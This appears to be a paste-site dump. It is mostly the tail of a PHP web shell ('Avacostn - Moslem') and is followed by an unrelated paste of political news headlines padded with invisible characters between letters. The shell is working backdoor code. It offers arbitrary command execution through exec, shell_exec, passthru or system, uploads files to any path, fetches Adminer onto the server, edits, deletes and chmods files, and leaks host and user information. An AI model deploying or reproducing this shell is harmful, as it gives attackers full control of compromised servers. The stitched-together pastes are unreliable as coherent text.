            text-align: center;
        }
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
        .empty-button {
            background: none;
            border: none;
            color: transparent;
            cursor: pointer;
            padding: 0;
            outline: none;

        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        table th, table td {
            padding: 10px;
            border: 1px solid #ccc;
        }
        table th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        .sidebar {
            position: fixed;
            top: 0;
            margin: 20px auto;
            padding: 20px;
            right: -300px;
            width: 300px;
            height: 100%;
            background-color: #f2f2f2;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            transition: right 0.3s ease-in-out;
        }
        .sidebar.open {
            right: 0;
        }
        .sidebar-content {
            padding: 20px;
        }
        .sidebar-close {
            text-align: right;
            margin-bottom: 20px;
        }
        .sidebar-close button {
            padding: 5px 10px;
            border: none;
            background-color: #ccc;
            color: #fff;
            cursor: pointer;
        }
        .menu-icon {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 30px;
            height: 30px;
            background-color: #ccc;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .menu-icon::before,
        .menu-icon::after {
            content: """";
            position: absolute;
            width: 20px;
            height: 2px;
            background-color: #fff;
            transition: transform 0.3s ease-in-out;
        }

        .menu-icon::before {
            transform: translateY(-6px);
        }

        .menu-icon::after {
            transform: translateY(6px);
        }

        .menu-icon.open::before {
            transform: translateY(0px) rotate(45deg);
        }

        .menu-icon.open::after {
            transform: translateY(0px) rotate(-45deg);
        }

        .sidebar h2 {
            margin-top: 0;
        }

        .info-list {
            list-style: none;
            padding: 0;
        }

        .info-list li {
            margin-bottom: 10px;
        }

        .info-list li:last-child {
            margin-bottom: 0;
        }

        .sidebar .info-container {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class=""container"">
        <h1>Avacostn - Moslem</h1>
        <div class=""menu-icon"" onclick=""toggleSidebar()""></div>
        <hr>
        <div class=""button-container"">
            <div class=""input-file"">
                <label class=""input-file-label"" for=""file-input"">Choose File</label>
                <form action="""" method=""post"" enctype=""multipart/form-data"">
                    <input id=""file-input"" type=""file"" name=""file"" />
                    <input class=""button"" type=""submit"" value=""Upload"" />
                </form>
                <?php
                    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
                    $path = str_replace('\\', '/', $path);
                    $paths = @explode('/', $path);
                ?>
                <hr>
                DIR : <a href=""?path=/"">Home</a>
                <?php
                foreach ($paths as $id => $pat) {
                    if ($pat == '' && $id == 0) {
                        echo '<a href=""?path=/"">/</a>';
                        continue;
                    }
                    if ($pat == '') {
                        continue;
                    }
                    $linkPath = implode('/', array_slice($paths, 0, $id + 1));
                    echo ""<a href=\""?path=$linkPath\"">$pat</a>/"";
                }
                ?>
            </div>
            <div class=""input-summon"">
                <form action="""" method=""post"">
                    <input type=""hidden"" name=""summon"" value=""true"" />
                    <input class=""button"" type=""submit"" value=""Summon"" />
                </form>
            </div>
        </div>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['summon']) && $_POST['summon'] === 'true') {
            $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $fileName = 'adminer.php';
            $filePath = $path . '/' . $fileName;
            $fileContent = @file_get_contents($baseUrl);
            if ($fileContent !== false) {
                if (file_put_contents($filePath, $fileContent) !== false) {
                    echo ""<p>Summon successfully. $filePath .</p>"";
                } else {
                    echo ""<p>Summon failed.</p>"";
                }
            } else {
                echo ""<p>Failed to fetch the file content. None File</p>"";
            }
        }
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
           
            if ($_FILES['file']['size'] === 0) {
                echo ""<p>Open Ur Eyes Bitch !!!.</p>"";
            } else {
                $uploadPath = $path . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                    echo ""<p>File uploaded successfully. $uploadPath .</p>"";
                } else {
                    echo ""<p>File upload failed.</p>"";
                }
            }
        }
        ?>
    </div>

    <div class=""container"">
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
                $cmdOutput = null;
                $cmd = $_POST['cmd'];
                $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
                $cmd = ""cd "" . escapeshellarg($path) . "" && "" . $cmd;
                if (function_exists('exec')) {
                    @exec($cmd, $output, $returnVar);
                    if ($returnVar === 0) {
                        $cmdOutput = implode(""\n"", $output);
                    }
                } elseif (function_exists('shell_exec')) {
                    $cmdOutput = @shell_exec($cmd);
                } elseif (function_exists('passthru')) {
                    ob_start();
                   @passthru($cmd, $returnVar);
                    $cmdOutput = ob_get_clean();
                } elseif (function_exists('system')) {
                    ob_start();
                    @system($cmd, $returnVar);
                    $cmdOutput = ob_get_clean();
                }
            }
            ?>
            <form method=""POST"" action="""">
                <?php echo @get_current_user() . ""@"" . @gethostbyname($_SERVER['HTTP_HOST']) . "": ~ $""; ?><input type='text' size='30' height='10' name='cmd' placeholder='Enter a command...'>
                 <input type=""submit"" class=""empty-button"">
            </form>
    </div>
    <?php if (!empty($cmdOutput)) { ?>
        <div class=""message-container"">
            <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
        </div>
    <?php } ?>
   <?php
    if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = $path . '/' . $file;
    $fileContent = @file_get_contents($filePath);
    if ($fileContent !== false) {
        echo ""<div class=\""message-container\"">"";
        echo ""<p>Edit File: $file</p>"";
        echo ""<form method=\""POST\"" action=\""\"">"";
        echo ""<input type=\""hidden\"" name=\""edit\"" value=\""true\"">"";
        echo ""<input type=\""hidden\"" name=\""file\"" value=\""$file\"">"";
        echo ""<textarea name=\""new_content\"" rows=\""10\"" cols=\""100\"" placeholder=\""Enter new content...\"">"" . htmlspecialchars($fileContent) . ""</textarea>"";
        echo ""<input type=\""submit\"" value=\""Edit\"">"";
        echo ""</form>"";
        echo ""</div>"";
        }
        }
        ?>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['rename'])) {
        $oldName = $_GET['rename'];
        echo ""<div class=\""message-container\"">"";
        echo ""<p>Rename : $oldName</p>"";
        echo ""<form method=\""POST\"" action=\""\"">"";
        echo ""<input type=\""hidden\"" name=\""rename\"" value=\""true\"">"";
        echo ""<input type=\""hidden\"" name=\""old_name\"" value=\"""" . htmlspecialchars($oldName) . ""\"">"";
        echo ""<input type=\""text\"" name=\""new_name\"" placeholder=\""Enter new name\"" required>"";
        echo ""<input type=\""submit\"" value=\""Rename\"">"";
        echo ""</form>"";
        echo ""</div>"";
        ?>
    <?php } ?>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit']) && $_POST['edit'] === 'true') {
            $editedFile = $_POST['file'];
            $newContent = $_POST['new_content'];
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $filePath = $path . '/' . $editedFile;
            if (file_put_contents($filePath, $newContent) !== false) {
                echo ""<div class='message-container'><p>File saved successfully. $filePath </p>"";
            } else {
                echo ""<p>Failed to save the file.</p></div>"";
            }
        }
        ?>    
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename']) && $_POST['rename'] === 'true') {
            $oldName = $_POST['old_name'];
            $newName = $_POST['new_name'];
            $newPath = $path . '/' . $newName;
            $oldPath = $path . '/' . $oldName;
            
            if (rename($oldPath, $newPath)) {
                echo ""<div class='message-container'><p>Renaming successful. $newName</p>"";
            } else {
                echo ""<p>Failed to rename.</p></div>"";
            }
        }
        ?>
<?php
// ...
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['delete'])) {
    $deletePath = $_GET['delete'];
    $deletePath = str_replace('/', '', $deletePath); // Mencegah traversal path
    $deletePath = $path . '/' . $deletePath;

    if (is_file($deletePath)) {
        if (unlink($deletePath)) {
            echo ""<div class='message-container'><p>File deleted successfully: $deletePath</p></div>"";
        } else {
            echo ""<div class='message-container'><p>Failed to delete the file: $deletePath</p></div>"";
        }
    } elseif (is_dir($deletePath)) {
        if (rmdir($deletePath)) {
            echo ""<div class='message-container'><p>Folder deleted successfully: $deletePath</p></div>"";
        } else {
            echo ""<div class='message-container'><p>Failed to delete the folder: $deletePath</p></div>"";
        }
    } else {
        echo ""<div class='message-container'><p>Invalid file or folder path: $deletePath</p></div>"";
    }
}
// ...
?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['chmod'])) {
    $chmodPath = $_GET['chmod'];
    $chmodPath = str_replace('/', '', $chmodPath); // Mencegah traversal path
    $chmodPath = $path . '/' . $chmodPath;
    
    if (is_file($chmodPath) || is_dir($chmodPath)) {
        if (isset($_GET['mode']) && preg_match('/^[0-7]{3}$/', $_GET['mode'])) {
            $mode = intval($_GET['mode'], 8);
            if (chmod($chmodPath, $mode)) {
                echo ""<div class='message-container'><p>Chmod successful: $chmodPath</p></div>"";
            } else {
                echo ""<div class='message-container'><p>Failed to chmod: $chmodPath</p></div>"";
            }
        } else {
            $currentMode = fileperms($chmodPath) & 0777;
            echo ""<div class='message-container'>"";
            echo ""<p>Chmod: $chmodPath</p>"";
            echo ""<form method='GET' action=''>"";
            echo ""<input type='hidden' name='path' value='$path'>"";
            echo ""<input type='hidden' name='chmod' value='$chmodPath'>"";
            echo ""<input type='text' name='mode' placeholder='Enter new mode (e.g., 755)' required>"";
            echo ""<input type='submit' value='Chmod'>"";
            echo ""</form>"";
            echo ""<p>Current mode: $currentMode</p>"";
            echo ""</div>"";
        }
    } else {
        echo ""<div class='message-container'><p>Invalid file or folder path: $chmodPath</p></div>"";
    }
}
?>
</div>

    <div class=""container"">
        <h2>Filemanager</h2>
        <table>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permission</th>
                <th>Actions</th>

            </tr>
            <?php
            $scandir = @scandir($path);
            if ($scandir !== false) {
                $folders = [];
                $files = [];
                foreach ($scandir as $file) {
                    $filePath = ""$path/$file"";
                    if (is_dir($filePath)) {
                        $folders[] = $file;
                    } else if (is_file($filePath)) {
                        $size = filesize($filePath);
                        $size = formatSizeUnits($size);
                        $perms = fileperms($filePath);
                        $permission = getPermissionString($perms);
                        $files[$file] = [
                            'size' => $size,
                            'permission' => $permission
                        ];
                    }
                }
                foreach ($folders as $folder) {
                    $folderPath = ""$path/$folder"";
                    $folderPermissionColor = (is_writable($folderPath)) ? 'green' : 'red';
                    ?>

                    <tr>
    <td>
        <a href=""?path=<?php echo $folderPath; ?>""><?php echo $folder; ?></a>
    </td>
    <td>
        <span style=""color: <?php echo $folderPermissionColor; ?>""><?php echo getPermissionString(fileperms($folderPath)); ?></span>
    </td>
    <td>-</td>
    <td>
        <select onchange=""folderDropdownAction(this.value, '<?php echo $path; ?>', '<?php echo $folder; ?>')"">
            <option value="""" selected disabled>Actions</option>
            <option value=""rename"">Rename</option>
            <option value=""delete"">Delete</option>
            <option value=""chmod"">Chmod</option>
        </select>
    </td>
</tr>

<script>
    function folderDropdownAction(action, path, folder) {
        if (action === 'rename') {
            window.location.href = ""?path="" + path + ""&rename="" + folder;
        } else if (action === 'delete') {
            var confirmation = confirm('Apakah Anda yakin ingin menghapus folder ini?');
            if (confirmation) {
                window.location.href = ""?path="" + path + ""&delete="" + folder;
            }
        } else if (action === 'chmod') {
            window.location.href = ""?path="" + path + ""&chmod="" + folder;
        }
    }
</script>

                <?php
                }

                foreach ($files as $file => $data) {
                    $filePermissionColor = (is_writable($path . '/' . $file)) ? 'green' : 'red';
                    ?>
                        <tr>
    <td>
        <a href=""?path=<?php echo $path; ?>&file=<?php echo $file; ?>""><?php echo $file; ?></a>
    </td>
    <td><?php echo $data['size']; ?></td>
    <td>
        <span style=""color: <?php echo $filePermissionColor; ?>""><?php echo $data['permission']; ?></span>
    </td>
    <td>
        <select onchange=""dropdownAction(this.value, '<?php echo $path; ?>', '<?php echo $file; ?>')"">
            <option value="""" selected disabled>Actions</option>
            <option value=""edit"">Edit</option>
            <option value=""delete"">Delete</option>
            <option value=""chmod"">Chmod</option>
            <option value=""rename"">Rename</option>
        </select>
    </td>
</tr>

<script>
    function dropdownAction(action, path, file) {
        if (action === 'edit') {
            window.location.href = ""?path="" + path + ""&file="" + file;
        } else if (action === 'delete') {
            var confirmation = confirm('Apakah Anda yakin ingin menghapus file ini?');
            if (confirmation) {
                window.location.href = ""?path="" + path + ""&delete="" + file;
            }
        } else if (action === 'chmod') {
            window.location.href = ""?path="" + path + ""&chmod="" + file;
        } else if (action === 'rename') {
            window.location.href = ""?path="" + path + ""&rename="" + file;
        }
    }
</script>


                <?php
                }
            } else {
                echo ""<tr><td colspan=\""4\"">None Directory</td></tr>"";
            }

            function getPermissionString($perms)
            {
                $info = '';

                // Owner
                $info .= (($perms & 0x0100) ? 'r' : '-');
                $info .= (($perms & 0x0080) ? 'w' : '-');
                $info .= (($perms & 0x0040) ?
                    (($perms & 0x0800) ? 's' : 'x') :
                    (($perms & 0x0800) ? 'S' : '-'));

                // Group
                $info .= (($perms & 0x0020) ? 'r' : '-');
                $info .= (($perms & 0x0010) ? 'w' : '-');
                $info .= (($perms & 0x0008) ?
                    (($perms & 0x0400) ? 's' : 'x') :
                    (($perms & 0x0400) ? 'S' : '-'));

                // Other
                $info .= (($perms & 0x0004) ? 'r' : '-');
                $info .= (($perms & 0x0002) ? 'w' : '-');
                $info .= (($perms & 0x0001) ?
                    (($perms & 0x0200) ? 't' : 'x') :
                    (($perms & 0x0200) ? 'T' : '-'));

                return $info;
            }

            function formatSizeUnits($bytes)
            {
                $units = array('bytes', 'KB', 'MB', 'GB');
                $index = 0;

                while ($bytes >= 1024 && $index < 3) {
                    $bytes /= 1024;
                    $index++;
                }

                return round($bytes, 2) . ' ' . $units[$index];
            }
            ?>
        </table>
    </div>
    <div class=""sidebar"" id=""sidebar"">
        <div class=""sidebar-content"">
            <div class=""sidebar-close"">
                <button onclick=""toggleSidebar()"">Close</button>
            </div>
            <div class=""info-container"">
                <h2>Server Info</h2>
                <?php
                function countDomainsInServer() {
                    $serverName = $_SERVER['SERVER_NAME'];
                    $ipAddresses = @gethostbynamel($serverName);

                    if ($ipAddresses !== false) {
                        return count($ipAddresses);
                    } else {
                        return 0;
                    }
                }

                $domainCount = @countDomainsInServer();
                function formatBytes($bytes, $precision = 2) {
                    $units = array('B', 'KB', 'MB', 'GB', 'TB');

                    $bytes = max($bytes, 0);
                    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                    $pow = min($pow, count($units) - 1);

                    $bytes /= (1 << (10 * $pow));

                    return round($bytes, $precision) . ' ' . $units[$pow];
                }
                ?>
                <ul class=""info-list"">
                    <li>Hostname: <?php echo @gethostname(); ?></li>
                    <?php if (isset($_SERVER['SERVER_ADDR'])): ?>
                        <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                    <?php endif; ?>
                    <li>PHP Version: <?php echo @phpversion(); ?></li>
                    <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                    <?php if (function_exists('disk_total_space')): ?>
                        <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                        <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                    <?php endif; ?>
                    <li>Safe Mode: <?php echo @ini_get('safe_mode') ? 'Enabled' : 'Disabled'; ?></li>
                    <li>Disable Functions: <?php echo @ini_get('disable_functions'); ?></li>
                    <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                    <li>System: <?php echo @php_uname(); ?></li>
                </ul>
            </div>
            <div class=""info-container"">
                <h2>User Info</h2>
                <ul class=""info-list"">
                    <li>Username: <?php echo @get_current_user(); ?></li>
                    <li>User ID: <?php echo @getmyuid(); ?></li>
                    <li>Group ID: <?php echo @getmygid(); ?></li>
                </ul>
            </div>
        </div>
    </div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }

        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class='footer'><p>&copy; <?php echo date('Y'); ?> <a href=""https://www.blog-gan.org"">Shin Code</a>. All rights reserved.</p>
</div>
</body>
</html>
"
i4dcnu9F,News Dec22 23,Newscaster_Ned,Email,Friday 22nd of December 2023 08:46:05 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

❄️❄️❄️❄️❄️❄️❄️❄️❄️❄️❄️❄️‎️‎I‎t‎'‎s‎ ‎a‎l‎m‎o‎s‎t‎ ‎C‎h‎r‎i‎s‎t‎m‎a‎s‎,‎ ‎b‎i‎t‎c‎h‎e‎s‎!🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻🎅🏻

M‎e‎d‎i‎a‎ ‎B‎l‎a‎m‎e‎ ‎T‎r‎u‎m‎p‎ ‎A‎f‎t‎e‎r‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎P‎r‎e‎s‎s‎u‎r‎e‎d‎ ‎W‎a‎y‎n‎e‎ ‎C‎o‎u‎n‎t‎y‎ ‎C‎a‎n‎v‎a‎s‎s‎e‎r‎s‎ ‎t‎o‎ ‎C‎h‎a‎n‎g‎e‎ ‎V‎o‎t‎e‎
T‎u‎r‎l‎e‎y‎:‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎6‎ ‎W‎a‎s‎n‎'‎t‎ ‎I‎n‎s‎u‎r‎r‎e‎c‎t‎i‎o‎n‎ ‎o‎r‎ ‎R‎e‎b‎e‎l‎l‎i‎o‎n‎
L‎a‎x‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎ ‎o‎f‎ ‎P‎r‎o‎-‎H‎a‎m‎a‎s‎ ‎R‎i‎o‎t‎e‎r‎s‎ ‎C‎o‎m‎p‎a‎r‎e‎d‎ ‎t‎o‎ ‎F‎r‎e‎e‎d‎o‎m‎ ‎C‎o‎n‎v‎o‎y‎
F‎o‎r‎m‎e‎r‎ ‎V‎a‎t‎i‎c‎a‎n‎ ‎C‎h‎i‎e‎f‎:‎ ‎B‎l‎e‎s‎s‎i‎n‎g‎ ‎G‎a‎y‎ ‎C‎o‎u‎p‎l‎e‎s‎ ‎‘‎T‎r‎i‎v‎i‎a‎l‎i‎z‎e‎s‎ ‎S‎i‎n‎’‎
M‎e‎r‎r‎y‎ ‎C‎h‎r‎i‎s‎t‎m‎a‎s‎!‎ ‎I‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎G‎a‎u‎g‎e‎ ‎S‎h‎o‎w‎s‎ ‎P‎r‎i‎c‎e‎s‎ ‎A‎c‎r‎o‎s‎s‎ ‎U‎.‎S‎.‎ ‎F‎a‎l‎l‎i‎n‎g‎
H‎a‎m‎a‎s‎ ‎M‎u‎r‎d‎e‎r‎e‎d‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎H‎o‎s‎t‎a‎g‎e‎ ‎A‎b‎d‎u‎c‎t‎e‎d‎ ‎D‎u‎r‎i‎n‎g‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎A‎t‎t‎a‎c‎k‎
N‎Y‎T‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎K‎e‎e‎p‎ ‎H‎o‎p‎i‎n‎g‎ ‎t‎o‎ ‎T‎a‎k‎e‎ ‎D‎o‎w‎n‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎O‎u‎t‎s‎i‎d‎e‎ ‎B‎a‎l‎l‎o‎t‎ ‎B‎o‎x‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎D‎r‎a‎f‎t‎i‎n‎g‎ ‎B‎i‎l‎l‎s‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎r‎o‎m‎ ‎B‎a‎l‎l‎o‎t‎s‎ ‎i‎n‎ ‎3‎ ‎S‎t‎a‎t‎e‎s‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎a‎r‎r‎i‎v‎e‎s‎ ‎a‎t‎ ‎D‎e‎l‎a‎w‎a‎r‎e‎ ‎A‎i‎r‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎G‎u‎a‎r‎d‎ ‎B‎a‎s‎e‎ ‎i‎n‎ ‎N‎e‎w‎ ‎C‎a‎s‎t‎l‎e‎,‎ ‎D‎e‎l‎.‎,‎ ‎w‎i‎t‎h‎ ‎f‎i‎r‎s‎t‎ ‎l‎a‎d‎y‎ ‎J‎i‎l‎l‎ ‎B‎i‎d‎e‎n‎,‎ ‎S‎u‎n‎d‎a‎y‎,‎ ‎D‎e‎c‎.‎ ‎1‎7‎,‎ ‎2‎0‎2‎3‎.‎ ‎(‎A‎P‎ ‎P‎h‎o‎t‎o‎/‎M‎a‎n‎u‎e‎l‎ ‎B‎a‎l‎c‎e‎ ‎C‎e‎n‎e‎t‎a‎)‎
I‎f‎ ‎B‎i‎d‎e‎n‎ ‎i‎s‎ ‎r‎e‎m‎o‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎b‎a‎l‎l‎o‎t‎s‎,‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎w‎i‎l‎l‎ ‎h‎a‎v‎e‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎y‎ ‎w‎i‎n‎n‎i‎n‎g‎ ‎t‎h‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎p‎r‎i‎m‎a‎r‎y‎ ‎a‎n‎d‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎e‎l‎e‎c‎t‎i‎o‎n‎.‎ ‎G‎e‎o‎r‎g‎i‎a‎,‎ ‎A‎r‎i‎z‎o‎n‎a‎,‎ ‎a‎n‎d‎ ‎P‎e‎n‎n‎s‎y‎l‎v‎a‎n‎i‎a‎ ‎a‎r‎e‎ ‎v‎i‎t‎a‎l‎ ‎s‎w‎i‎n‎g‎ ‎s‎t‎a‎t‎e‎s‎.‎ ‎

B‎i‎d‎e‎n‎'‎s‎ ‎B‎o‎r‎d‎e‎r‎:‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎G‎i‎v‎e‎n‎ ‎A‎s‎y‎l‎u‎m‎ ‎H‎e‎a‎r‎i‎n‎g‎s‎ ‎N‎e‎a‎r‎l‎y‎ ‎a‎ ‎D‎e‎c‎a‎d‎e‎ ‎A‎w‎a‎y‎
B‎i‎d‎e‎n‎'‎s‎ ‎B‎o‎r‎d‎e‎r‎:‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎G‎i‎v‎e‎n‎ ‎A‎s‎y‎l‎u‎m‎ ‎H‎e‎a‎r‎i‎n‎g‎s‎ ‎N‎e‎a‎r‎l‎y‎ ‎a‎ ‎D‎e‎c‎a‎d‎e‎ ‎A‎w‎a‎y‎
1‎,‎3‎9‎5‎
S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎P‎r‎o‎b‎i‎n‎g‎ ‎J‎o‎h‎n‎ ‎S‎c‎h‎n‎e‎i‎d‎e‎r‎ ‎o‎f‎ ‎‘‎D‎u‎k‎e‎s‎ ‎o‎f‎ ‎H‎a‎z‎z‎a‎r‎d‎’‎
S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎P‎r‎o‎b‎i‎n‎g‎ ‎J‎o‎h‎n‎ ‎S‎c‎h‎n‎e‎i‎d‎e‎r‎ ‎o‎f‎ ‎‘‎D‎u‎k‎e‎s‎ ‎o‎f‎ ‎H‎a‎z‎z‎a‎r‎d‎’‎
4‎3‎4‎
T‎r‎u‎d‎e‎a‎u‎'‎s‎ ‎C‎a‎n‎a‎d‎a‎ ‎O‎p‎e‎n‎s‎ ‎t‎h‎e‎ ‎D‎o‎o‎r‎ ‎t‎o‎ ‎E‎s‎c‎a‎p‎e‎e‎s‎ ‎F‎l‎e‎e‎i‎n‎g‎ ‎'‎U‎n‎l‎i‎v‎a‎b‎l‎e‎'‎ ‎G‎a‎z‎a‎
T‎r‎u‎d‎e‎a‎u‎'‎s‎ ‎C‎a‎n‎a‎d‎a‎ ‎O‎p‎e‎n‎s‎ ‎t‎h‎e‎ ‎D‎o‎o‎r‎ ‎t‎o‎ ‎E‎s‎c‎a‎p‎e‎e‎s‎ ‎F‎l‎e‎e‎i‎n‎g‎ ‎'‎U‎n‎l‎i‎v‎a‎b‎l‎e‎'‎ ‎G‎a‎z‎a‎
1‎5‎1‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎0‎ ‎D‎e‎a‎d‎,‎ ‎S‎e‎v‎e‎r‎a‎l‎ ‎M‎o‎r‎e‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎i‎n‎ ‎P‎r‎a‎g‎u‎e‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎0‎ ‎D‎e‎a‎d‎,‎ ‎S‎e‎v‎e‎r‎a‎l‎ ‎M‎o‎r‎e‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎i‎n‎ ‎P‎r‎a‎g‎u‎e‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎
4‎,‎0‎8‎7‎
F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎ ‎o‎n‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎T‎r‎u‎m‎p‎ ‎J‎a‎i‎l‎ ‎T‎i‎m‎e‎:‎ ‎N‎o‎ ‎'‎S‎p‎e‎c‎i‎a‎l‎ ‎B‎r‎e‎a‎k‎'‎
F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎ ‎o‎n‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎T‎r‎u‎m‎p‎ ‎J‎a‎i‎l‎ ‎T‎i‎m‎e‎:‎ ‎N‎o‎ ‎'‎S‎p‎e‎c‎i‎a‎l‎ ‎B‎r‎e‎a‎k‎'‎
1‎,‎2‎8‎6‎
W‎e‎i‎s‎s‎m‎a‎n‎n‎:‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎i‎e‎d‎ ‎S‎o‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎L‎i‎k‎e‎ ‎T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎B‎e‎ ‎B‎a‎n‎n‎e‎d‎ ‎f‎r‎o‎m‎ ‎B‎a‎l‎l‎o‎t‎
W‎e‎i‎s‎s‎m‎a‎n‎n‎:‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎i‎e‎d‎ ‎S‎o‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎L‎i‎k‎e‎ ‎T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎B‎e‎ ‎B‎a‎n‎n‎e‎d‎ ‎f‎r‎o‎m‎ ‎B‎a‎l‎l‎o‎t‎
3‎,‎0‎7‎7‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎-‎-‎ ‎T‎r‎u‎m‎p‎ ‎L‎a‎w‎y‎e‎r‎ ‎H‎a‎b‎b‎a‎:‎ ‎T‎r‎u‎m‎p‎ ‎N‎o‎t‎ ‎S‎h‎a‎k‎e‎n‎ ‎b‎y‎ ‎C‎o‎l‎o‎r‎a‎d‎o‎ ‎D‎e‎c‎i‎s‎i‎o‎n‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎-‎-‎ ‎T‎r‎u‎m‎p‎ ‎L‎a‎w‎y‎e‎r‎ ‎H‎a‎b‎b‎a‎:‎ ‎T‎r‎u‎m‎p‎ ‎N‎o‎t‎ ‎S‎h‎a‎k‎e‎n‎ ‎b‎y‎ ‎C‎o‎l‎o‎r‎a‎d‎o‎ ‎D‎e‎c‎i‎s‎i‎o‎n‎
4‎,‎5‎1‎5‎
